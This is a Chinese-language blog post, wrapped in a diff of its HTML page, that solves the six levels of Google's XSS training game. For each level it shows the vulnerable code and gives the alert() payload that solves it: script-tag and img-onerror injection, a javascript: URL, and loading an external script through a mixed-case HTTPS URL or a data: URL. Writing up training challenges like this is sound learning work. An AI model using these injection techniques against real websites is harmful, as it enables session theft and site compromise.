@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>google xss-game 题目解答 | Rock&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0.前言在花了一个下午和晚上之后,终于做完了这六道题目,感觉还是挺有收获的.整体感觉这六道题目比较简单,难度不高. 这是站点 : https:&#x2F;&#x2F;xss-game.appspot.com&#x2F; 1.闲言少叙,书归正转.Level 1: Hello, world of XSS入手点：    level.py的第44行代码   # Our search engine broke, we found no">
+<meta property="og:type" content="article">
+<meta property="og:title" content="google xss-game 题目解答">
+<meta property="og:url" content="https://rock718.github.io.git/2017/08/14/xss-game-writeup/index.html">
+<meta property="og:site_name" content="Rock&#39;s blog">
+<meta property="og:description" content="0.前言在花了一个下午和晚上之后,终于做完了这六道题目,感觉还是挺有收获的.整体感觉这六道题目比较简单,难度不高. 这是站点 : https:&#x2F;&#x2F;xss-game.appspot.com&#x2F; 1.闲言少叙,书归正转.Level 1: Hello, world of XSS入手点：    level.py的第44行代码   # Our search engine broke, we found no">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rock718.github.io.git/images/2017/08/level4.jpg">
+<meta property="og:image" content="https://rock718.github.io.git/images/2017/08/level5.jpg">
+<meta property="og:image" content="https://rock718.github.io.git/images/2017/08/level6(1).jpg">
+<meta property="og:image" content="https://rock718.github.io.git/images/2017/08/level6(2).jpg">
+<meta property="article:published_time" content="2017-08-14T03:21:09.000Z">
+<meta property="article:modified_time" content="2017-09-27T12:26:55.000Z">
+<meta property="article:author" content="Rock">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rock718.github.io.git/images/2017/08/level4.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Rock&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <!--<div id="banner"></div>-->
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        <a href="/" id="main-nav-title" class="main-nav-link">Rock&#39;s blog</a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives/">Archives</a>
+        
+          <a class="main-nav-link" href="/about/">about</a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-xss-game-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      google xss-game 题目解答
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h2><p>在花了一个下午和晚上之后,终于做完了这六道题目,感觉还是挺有收获的.整体感觉这六道题目比较简单,难度不高.</p>
+<p>这是站点 : <a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p>
+<h2 id="1-闲言少叙-书归正转"><a href="#1-闲言少叙-书归正转" class="headerlink" title="1.闲言少叙,书归正转."></a>1.闲言少叙,书归正转.</h2><h3 id="Level-1-Hello-world-of-XSS"><a href="#Level-1-Hello-world-of-XSS" class="headerlink" title="Level 1: Hello, world of XSS"></a>Level 1: Hello, world of XSS</h3><p>入手点：<br>    level.py的第44行代码</p>
+<pre><code>  # Our search engine broke, we found no results :-(
+      message = &quot;Sorry, no results were found for &lt;b&gt;&quot; + query + &quot;&lt;/b&gt;.&quot;
+      message += &quot; &lt;a href=&#39;?&#39;&gt;Try again&lt;/a&gt;.&quot;
+</code></pre>
+<p>思路：<br>    直接闭合 &lt;b&gt; 标签,插入js代码</p>
+<p>答案：</p>
+<pre><code>&lt;/b&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;b&gt;
+</code></pre>
+<h3 id="Level-2-Persistence-is-key"><a href="#Level-2-Persistence-is-key" class="headerlink" title="Level 2: Persistence is key"></a>Level 2: Persistence is key</h3><p>入手点：<br>    index.html的第30行代码</p>
+<pre><code>html += &quot;&lt;blockquote&gt;&quot; + posts[i].message + &quot;&lt;/blockquote&quot;;
+</code></pre>
+<p>思路：<br>    这道题我一开始想用上道题的套路，但显然不可以。具体为什么我还不是很明白。根据题目的提示，貌似可以利用 &lt;img&gt; 标签的onerror属性。</p>
+<p>答案：</p>
+<pre><code>&lt;img src=&quot;***&quot; onerror=&quot;alert()&quot;&gt;
+</code></pre>
+<h3 id="Level-3-That-sinking-feeling…"><a href="#Level-3-That-sinking-feeling…" class="headerlink" title="Level 3: That sinking feeling…"></a>Level 3: That sinking feeling…</h3><p>入手点：<br>    index.html的第17行代码</p>
+<pre><code>html += &quot;&lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt;&quot;;
+</code></pre>
+<p>思路：<br>    这道题乍一看没有让用户输入的地方。通过查看代码第43行，我们知道页面会调用chooseTab函数，将url中#后面的字符串做为参数传入。我们需要构造一个字符串，使img标签加载的时候执行我们的代码。</p>
+<p>答案：</p>
+<pre><code>&#39;onerror=&quot;alert()&quot;/&gt;
+</code></pre>
+<h3 id="Level-4-Context-matters"><a href="#Level-4-Context-matters" class="headerlink" title="Level 4: Context matters"></a>Level 4: Context matters</h3><p>入手点：<br>    timer.html的第21行代码</p>
+<pre><code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#123;&#123; timer &#125;&#125;&#39;);&quot; /&gt;
+</code></pre>
+<p>思路：<br>    这道题通过构造特殊的timer变量值，使得<img>标签中的js代码得以执行。</p>
+<p>答案：</p>
+<pre><code>&#39;),alert()//
+</code></pre>
+<p>在做题目的时候发现自己的输入被转义成了html实体，以为无法被指执行，所以想破头也没想出来。在看了答案后才知道是能够被执行的。不过我还是不知道这是为什么？</p>
+<img src="../../../../images/2017/08/level4.jpg">
+
+<h3 id="Level-5-Breaking-protocol"><a href="#Level-5-Breaking-protocol" class="headerlink" title="Level 5: Breaking protocol"></a>Level 5: Breaking protocol</h3><p>入手点：<br>    signup.html的第15行代码</p>
+<pre><code>&lt;a href=&quot;&#123;&#123; next &#125;&#125;&quot;&gt;Next &gt;&gt;&lt;/a&gt;
+</code></pre>
+<p>思路：<br>    通过查看代码，三个html都是很简单的页面，只有signup.html调用了next变量，并放到了 &lt;a&gt; 标签中，我不禁想到利用其执行js代码。再通过读level.py我了解到当页面的url参数带有”signup”时，next的值为next变量获得的参数值。那么这道题目就很简单了，我们只需要利用 &lt;a&gt; 标签的url来执行代码。</p>
+<p>答案：</p>
+<pre><code>javascript:alert()
+</code></pre>
+<img src="../../../../images/2017/08/level5.jpg">
+
+<h3 id="Level-6-Follow-the-rabbit"><a href="#Level-6-Follow-the-rabbit" class="headerlink" title="Level 6: Follow the rabbit"></a>Level 6: Follow the rabbit</h3><p>入手点：<br>    index.html的第17~25行代码。</p>
+<pre><code>var scriptEl = document.createElement(&#39;script&#39;);
+
+  // This will totally prevent us from loading evil URLs!
+  if (url.match(/^https?:\/\//)) &#123;
+    setInnerText(document.getElementById(&quot;log&quot;),
+      &quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;);
+    return;
+  &#125;
+</code></pre>
+<p>思路：<br>    题目说得很清楚，利用外部js脚本执行alert()。但最大的问题是对我们给出的url做了过滤。这让我很头疼，心想难道 &lt;script&gt; 标签难道还有其他的属性可以利用？后来才了解到到题目只对小写的http和https过滤了，而url的协议与地址部分是不区分大小写的，也就是说我写成hTtPs:&#x2F;&#x2F;也是没问题的！</p>
+<p>答案：</p>
+<pre><code>HTTPS://www.rockblog.cn/test.js
+</code></pre>
+<img src="../../../../images/2017/08/level6(1).jpg">
+
+<p>让我惊喜的是还有一种在我看来更惊艳的答案，利用了data类型的url。</p>
+<p>解决方案如下：</p>
+<pre><code>data:text,alert()
+</code></pre>
+<img src="../../../../images/2017/08/level6(2).jpg">
+    
+<p>在下实在是佩服！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://rock718.github.io.git/2017/08/14/xss-game-writeup/" data-id="cl9y4cx9q005824fy2bvt6epn" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/09/03/kali-XX-Net/" id="article-nav-newer" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Newer</span>
+      <div class="article-nav-title">
+        
+          kali 安装 XX-Net openssl报错
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/07/11/hexo_build/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Older</span>
+      <div class="article-nav-title">利用腾讯云服务器搭建hexo博客</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 Rock<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
+      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives/" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/" class="mobile-nav-link">about</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
